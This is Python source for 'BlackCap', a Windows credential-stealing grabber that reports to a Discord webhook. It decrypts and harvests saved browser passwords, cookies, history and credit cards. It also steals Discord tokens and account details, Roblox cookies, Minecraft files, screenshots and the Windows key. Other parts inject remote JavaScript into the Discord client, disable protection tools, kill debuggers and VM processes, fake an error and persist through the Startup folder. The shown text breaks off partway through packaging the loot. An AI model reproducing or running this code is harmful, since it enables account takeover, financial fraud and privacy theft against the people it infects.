import asyncio
import json
import ntpath
import os
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import winreg
import zipfile
import httpx
import psutil
import win32gui
import win32con
import base64
import requests
import ctypes
import time


from sqlite3 import connect
from base64 import b64decode
from urllib.request import Request, urlopen
from shutil import copy2
from datetime import datetime, timedelta, timezone
from sys import argv
from tempfile import gettempdir, mkdtemp
from json import loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData


local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

Passw = [];

# `
#    "yourwebhookurl" = your discord webhook url
#    "blackcap_inject_url" = my javascript injection (i recommand to not change)
#    "hide" = you want to hide grabber? ('yes' or 'no')
#    "dbugkiller" = recommand to let this
#    "blprggg" = don't touch at this
#
# `



__config__ = {
    'yourwebhookurl': "%WEBHOOK_HERE%",
    'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
    'hide': '%_hide_script%',
    'ping': '%ping_enabled%',
    'pingtype': '%ping_type%',
    'fake_error':'%_error_enabled%',
    'startup': '%_startup_enabled%',
    'kill_discord_process': '%kill_discord_process%',
    'dbugkiller': '%_debugkiller%',
    'blprggg':
    [
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "cmd",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver"
    ]

}




infocom = os.getlogin()
vctm_pc = os.getenv("COMPUTERNAME")
r4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]

BlackCap_Regex = 'https://pastebin.com/raw/f4PM9Dse'
reg_req = requests.get(BlackCap_Regex) 
clear_reg = r"[\w-]{24}" + reg_req.text



class Functions(object):

    @staticmethod
    def gtmk3y(path: str or os.PathLike):
        if not ntpath.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        try:
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            return Functions.w1nd0_dcr(master_key[5:])
        except KeyError:
            return None

    @staticmethod
    def cnverttim(time: int or float) -> str:
        try:
            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
            codestamp = epoch + timedelta(microseconds=time)
            return codestamp
        except Exception:
            pass

    @staticmethod
    def w1nd0_dcr(encrypted_str: bytes) -> str:
        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

    @staticmethod
    def cr34t3_f1lkes(_dir: str or os.PathLike = gettempdir()):
        f1lenom = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = ntpath.join(_dir, f1lenom)
        open(path, "x")
        return path

    @staticmethod
    def dcrpt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'

    @staticmethod
    def g3t_H(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def sys_1fo() -> list:
        flag = 0x08000000
        sh1 = "wmic csproduct get uuid"
        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
        try:
            uuidwndz = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
        except Exception:
            uuidwndz = "N/A"
        try:
            w1nk33y = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
        except Exception:
            w1nk33y = "N/A"
        try:
            w1nv3r = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
        except Exception:
            w1nv3r = "N/A"
        return [uuidwndz, w1nv3r, w1nk33y]


    @staticmethod
    def net_1fo() -> list:
        ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
        req = httpx.get("https://ipinfo.io/json")
        if req.status_code == 200:
            data = req.json()
            ip = data.get('ip')
            city = data.get('city')
            country = data.get('country')
            region = data.get('region')
            org = data.get('org')
            loc = data.get('loc')
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
        return [ip, city, country, region, org, loc, googlemap]

    @staticmethod
    def fetch_conf(e: str) -> str or bool | None:
        return __config__.get(e)




class bl4ckc4p(Functions):
    def __init__(self):
        
        self.dscap1 = "https://discord.com/api/v9/users/@me"

        self.w3bh00k = self.fetch_conf('yourwebhookurl')

        self.hide = self.fetch_conf("hide")

        self.pingtype = self.fetch_conf("pingtype")

        self.pingonrun = self.fetch_conf("ping")
        
        self.baseurl = "https://discord.com/api/v9/users/@me"

        self.startupexe = self.fetch_conf("startup")
        
        self.fake_error = self.fetch_conf("fake_error")

        self.appdata = os.getenv("localappdata")

        self.roaming = os.getenv("appdata")
        
        self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')

        self.dir, self.temp = mkdtemp(), gettempdir()

        inf, net = self.sys_1fo(), self.net_1fo()

        self.uuidwndz, self.w1nv3r, self.w1nk33y = inf[0], inf[1], inf[2]

        self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]

        self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        self.h00ksreg = "api/webhooks"

        self.chrmrgx = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);
        
        self.baseurl = "https://discord.com/api/v9/users/@me"

        self.regex = clear_reg

        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens = []

        self.ids = []

        self.sep = os.sep;

        self.robloxcookies = [];

        self.chrome_key = self.gtmk3y(ntpath.join(self.chrmmuserdtt, "Local State"));


        os.makedirs(self.dir, exist_ok=True);


    

    def hiding(self: str) -> str:
        if self.hide == "yes":
            hide = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hide, win32con.SW_HIDE)

    def fakeerror(self: str) -> str:
        if self.fake_error == "yes":
            ctypes.windll.user32.MessageBoxW(None, 'Error code: BlackCap_0x988958\nSomething gone wrong.', 'Fatal Error', 0)

    def pingonrunning(self: str) -> str:
        ping1 = {
            'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
            'content': "@everyone"
            }
        ping2 = {
            'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
            'content': "@here"
            }
        if self.pingonrun == "yes":
            if self.h00ksreg in self.w3bh00k:
                if self.pingtype == "@everyone" or self.pingtype == "everyone":
                    httpx.post(self.w3bh00k, json=ping1)
            if self.pingtype == "@here" or self.pingtype == "here":
                if self.h00ksreg in self.w3bh00k :
                    httpx.post(self.w3bh00k, json=ping2)



    def startupblackcap(self: str) -> str:
        if self.startupexe == "yes":
            startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
            if os.path.exists(startup_path + argv[0]):
                os.remove(startup_path + argv[0])
                copy2(argv[0], startup_path)
            else:
                copy2(argv[0], startup_path)




    def _bexit(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        os._exit(0)

    def trexctrac(func):
        '''Decorator to safely catch and ignore exceptions'''
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def init(self):
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        if self.w3bh00k == "" or self.w3bh00k == "\x57EBHOOK_HERE":
            self._bexit()
            
        self.hiding()
        self.fakeerror()
        self.pingonrunning()
        self.startupblackcap()

        if self.fetch_conf('dbugkiller') and AntiDebug().inVM is True:
            self._bexit()
        await self.bypbd()
        await self.byptknp()

        function_list = [self.scrinsh, self.sysd1, self.grbtkn, self.grbmc, self.grbr0blx]


        if self.fetch_conf('kill_discord_process'):

            await self.kllprcsx()



        os.makedirs(ntpath.join(self.dir, 'Browsers'), exist_ok=True)
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.gtmk3y(path + '\\Local State')
            self.funcs = [
                self.grbcook,
                self.gethistez,
                self.grbpsw2,
                self.getccez
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass
            
        if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:
            os.makedirs(ntpath.join(self.dir, 'Google'), exist_ok=True)
            function_list.extend([self.grbpsw, self.grbcoke, self.grbhis])

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.ntfytkn()
        await self._1ject()
        self.ending()

    

    async def _1ject(self):
        # TO DO: reduce cognetive complexity
        for _dir in os.listdir(self.appdata):

            if 'discord' in _dir.lower():
                discord = self.appdata + os.sep + _dir
                for __dir in os.listdir(ntpath.abspath(discord)):

                    if re.match(r'app-(\d*\.\d*)*', __dir):
                        app = ntpath.abspath(ntpath.join(discord, __dir))
                        modules = ntpath.join(app, 'modules')


                        if not ntpath.exists(modules):
                            return


                        for ___dir in os.listdir(modules):

                            if re.match(r"discord_desktop_core-\d+", ___dir):
                                inj_path = modules + os.sep + ___dir + f'\\discord_desktop_core\\'

                                if ntpath.exists(inj_path):

                                    if self.srtupl0c not in argv[0]:
                                        try:
                                            os.makedirs(inj_path + 'blackcap', exist_ok=True)
                                        except PermissionError:
                                            pass

                                    if self.h00ksreg in self.w3bh00k:
                                        f = httpx.get(self.fetch_conf('blackcap_inject_url')).text.replace("%WEBHOOK%", self.w3bh00k)
                                    
                                    try:
                                        with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
                                            indexFile.write(f)
                                    except PermissionError:
                                        pass

                                    if self.fetch_conf('kill_discord_process'):
                                        os.startfile(app + self.sep + _dir + '.exe')

    async def byptknp(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        if not ntpath.exists(tp):
            return
        config = tp + "config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp + i)
            except FileNotFoundError:
                pass
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['ksch_is_here'] = "https://github.com/KSCHdsc"
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write("\n\n//KSCH_is_here | https://github.com/KSCHdsc")

    async def kllprcsx(self):
        bllist = self.fetch_conf('blprggg')
        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
            bllist.append(i)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in bllist):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass


    async def bypbd(self):
        bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
        if ntpath.exists(bd):
            x = self.h00ksreg
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'KSCHishere')
            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                f.write(content)

    @trexctrac
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grbtkn(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)





                                    

    def randomdircreator(self, _dir: str or os.PathLike = gettempdir()):
        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, file_name)
        open(path, "x")
        return path


    @trexctrac
    def grbpsw2(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return

        loginvault = self.randomdircreator()
        copy2(path, loginvault)
        conn = sqlite3.connect(loginvault)
        cursor = conn.cursor()
        with open(os.path.join(self.dir, "Browsers", "All Passwords.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                url, username, password = res
                password = self.dcrpt_val(password, self.masterkey)
                if url != "":
                    f.write(f"URL: {url}\nID: {username}\nPASSW0RD: {password}\n\n")
        cursor.close()
        conn.close()
        os.remove(loginvault)

    @trexctrac
    def grbcook(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = self.randomdircreator()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(self.dir, "Browsers", "All Cookies.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.dcrpt_val(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
        cursor.close()
        conn.close()
        os.remove(cookievault)








    @trexctrac
    def grbpsw(self):
        f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding="cp437", errors='ignore')
        for prof in os.listdir(self.chrmmuserdtt):
            if re.match(self.chrmrgx, prof):
                login_db = ntpath.join(self.chrmmuserdtt, prof, 'Login Data')
                login = self.cr34t3_f1lkes()

                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)
                    if url != "":
                        f.write(f"URL: {url}\nID: {username}\nPASSW0RD: {decrypted_password}\n\n")

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()



    @trexctrac
    def grbcoke(self):
        f = open(ntpath.join(self.dir, 'Google', 'Cookies.txt'), 'w', encoding="cp437", errors='ignore')
        for prof in os.listdir(self.chrmmuserdtt):

            if re.match(self.chrmrgx, prof):

                login_db = ntpath.join(self.chrmmuserdtt, prof, 'Network', 'cookies')
                login = self.cr34t3_f1lkes()


                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")

                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    decrypted_cookie = self.dcrpt_val(r[2], self.chrome_key)
                    if host != "":
                        f.write(f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                        self.robloxcookies.append(decrypted_cookie)

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()

    def gethistez(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        historyvault = self.randomdircreator()
        copy2(path, historyvault)
        conn = sqlite3.connect(historyvault)
        cursor = conn.cursor()
        with open(os.path.join(self.dir, "Browsers", "All History.txt"), 'a', encoding="utf-8") as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url and title and visit_count and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))
            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
        cursor.close()
        conn.close()
        os.remove(historyvault)

    def getccez(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        cardvault = self.randomdircreator()
        copy2(path, cardvault)
        conn = sqlite3.connect(cardvault)
        cursor = conn.cursor()
        with open(os.path.join(self.dir, "Browsers", "All Creditcards.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                if name_on_card and card_number_encrypted != "":
                    f.write(
                        f"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.dcrpt_val(card_number_encrypted, self.masterkey)}\n")
        f.close()
        cursor.close()
        conn.close()
        os.remove(cardvault)


    @trexctrac
    def grbhis(self):
        f = open(ntpath.join(self.dir, 'Google', 'History.txt'), 'w', encoding="cp437", errors='ignore')

        def xtractwbhist(db_cursor):
            web = ""
            db_cursor.execute('SELECT title, url, last_visit_time FROM urls')
            for item in db_cursor.fetchall():
                web += f"Search Title: {item[0]}\nURL: {item[1]}\nLAST VISIT TIME: {self.cnverttim(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
            return web


        def xtractwbs3rch(db_cursor):
            db_cursor.execute('SELECT term FROM keyword_search_terms')
            search_terms = ""

            for item in db_cursor.fetchall():
                if item[0] != "":
                    search_terms += f"{item[0]}\n"

            return search_terms


        for prof in os.listdir(self.chrmmuserdtt):

            if re.match(self.chrmrgx, prof):

                login_db = ntpath.join(self.chrmmuserdtt, prof, 'History')
                login = self.cr34t3_f1lkes()

                shutil.copy2(login_db, login)
                conn = sqlite3.connect(login)
                cursor = conn.cursor()


                search_history = xtractwbs3rch(cursor)
                web_history = xtractwbhist(cursor)

                f.write(f"{' '*17}SEARCH\n{'-'*50}\n{search_history}\n{' '*17}\n\nLinks History\n{'-'*50}\n{web_history}")

                cursor.close()
                conn.close()
                os.remove(login)
        f.close()


    def ntfytkn(self):

        f = open(self.dir + "\\Discord_Info.txt", "w", encoding="cp437", errors='ignore')

        for token in self.tokens:
            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            badges = ""
            flags = j['flags']
            if (flags == 1):
                badges += "Staff, "
            if (flags == 2):
                badges += "Partner, "
            if (flags == 4):
                badges += "Hypesquad Event, "
            if (flags == 8):
                badges += "Green Bughunter, "
            if (flags == 64):
                badges += "Hypesquad Bravery, "
            if (flags == 128):
                badges += "HypeSquad Brillance, "
            if (flags == 256):
                badges += "HypeSquad Balance, "
            if (flags == 512):
                badges += "Early Supporter, "
            if (flags == 16384):
                badges += "Gold BugHunter, "
            if (flags == 131072):
                badges += "Verified Bot Developer, "
            if (flags == 4194304):
                badges += "Active Developer, "
            if (badges == ""):
                badges = "None"

            email = j.get("email")
            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
            nitro_data = httpx.get(self.dscap1 + '/billing/subscriptions', headers=self.g3t_H(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(self.dscap1 + "/billing/payment-sources", headers=self.g3t_H(token)).text)) > 0)


            f.write(f"{' '*17}{user}\n{'-'*50}\nBilling?: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n")
        f.close()


    def grbmc(self):
        minecraftpath = ntpath.join(self.dir, 'Minecraft')
        os.makedirs(minecraftpath, exist_ok=True)
        mc = ntpath.join(self.roaming, '.minecraft')


        tgrb = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']


        for _file in tgrb:
            if ntpath.exists(ntpath.join(mc, _file)):
                shutil.copy2(ntpath.join(mc, _file), minecraftpath + self.sep + _file)

                

    def grbr0blx(self):
        def subproc(path):
            try:
                return subprocess.check_output(
                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                    creationflags=0x08000000).decode().rstrip()
            except Exception:
                return None
        reg_cookie = subproc(r'HKLM')
        if not reg_cookie:
            reg_cookie = subproc(r'HKCU')
        if reg_cookie:
            self.robloxcookies.append(reg_cookie)
        if self.robloxcookies:
            with open(self.dir + "\\Roblox_Cookies.txt", "w") as f:
                for i in self.robloxcookies:
                    f.write(i + '\n')

    def scrinsh(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()

    def sysd1(self):
        about = f"""
{infocom} | {vctm_pc}
Windows key: {self.w1nk33y}
Windows version: {self.w1nv3r}
RAM: {r4m}GB
DISK: {d1sk}GB
HWID: {self.uuidwndz}
IP: {self.ip}
City: {self.city}
Country: {self.country}
Region: {self.region}
Org: {self.org}
GoogleMaps: {self.googlemap}
        """
        with open(self.dir + "\\System_Info.txt", "w", encoding="utf-8", errors='ignore') as f:
            f.write(about)







    def ending(self):
        for i in os.listdir(self.dir):
            if i.endswith('.txt'):
                path = self.dir + self.sep + i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        ff.close()
                        os.remove(path)
                    else:
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("Black Cap Create By KS.H | https://github.com/KSCHdsc\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x + "\n\nBlack Cap Create By KSCH | https://github.com/KSCHdsc")

        _zipfile = ntpath.join(self.appdata, f'BC-[{infocom}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = ntpath.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = ntpath.abspath(ntpath.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

        file_count, files_found, tokens = 0, '', ''
        for _, __, files in os.walk(self.dir):
